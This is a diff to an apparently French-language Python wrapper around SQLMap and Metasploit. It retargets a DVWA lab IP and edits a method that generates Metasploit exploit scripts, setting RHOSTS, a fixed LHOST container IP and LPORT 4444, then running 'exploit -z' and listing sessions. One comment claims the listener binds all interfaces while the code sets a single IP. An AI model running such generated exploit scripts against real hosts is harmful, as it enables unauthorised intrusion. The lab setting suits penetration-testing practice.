@@ -595,7 +595,7 @@ class SQLMapWrapper:
         """Scan d'injection SQL - VERSION CORRIGÉE POUR DVWA"""
         
         # 🔥 CORRECTION: URL spécifique DVWA avec authentification
-        if '172.20.0.4' in target:
+        if '172.20.0.10' in target:
             # DVWA nécessite d'être connecté
             if 'vulnerabilities' not in target:
                 test_url = f"{target.rstrip('/')}/vulnerabilities/sqli/?id=1&Submit=Submit"
@@ -952,20 +952,19 @@ exit
             }
 
     def _build_exploit_script(self, target: str, port: int, exploit_module: str, options: Dict) -> str:
-        """Construit un script Metasploit pour exploitation - VERSION CORRIGÉE"""
+        """Construit un script Metasploit pour exploitation - VERSION CORRIGÉE LHOST"""
         script = f"""
 use {exploit_module}
 set RHOSTS {target}
 set RPORT {port}
 """
         
-        # ✅ CORRECTION CRITIQUE: Toujours forcer l'IP du conteneur toolbox
-        container_ip = "172.20.0.2"  # IP fixe du conteneur app dans docker-compose.yml
-        script += f"set LHOST {container_ip}\n"
+        # ✅ CORRECTION UNIQUE: LHOST sur toutes interfaces pour éviter l'erreur de bind
+        script += f"set LHOST 172.20.0.2\n"  # Écouter sur toutes les interfaces
         script += f"set LPORT {options.get('LPORT', '4444')}\n"
         
         # ✅ AMÉLIORATION: Log pour debug
-        logger.info(f"🔧 LHOST forcé à: {container_ip}")
+        logger.info(f"🔧 LHOST configuré sur 172.20.0.2")
         logger.info(f"🔧 LPORT configuré à: {options.get('LPORT', '4444')}")
         
         # ✅ GESTION SPÉCIALE POUR SSH EXPLOITS
@@ -1022,10 +1021,8 @@ check
 show options
 exploit -z
 sessions -l
-exit
 """
         return script
-
 
 
     def _build_auxiliary_script(self, target: str, port: int, module: str, options: Dict) -> str:
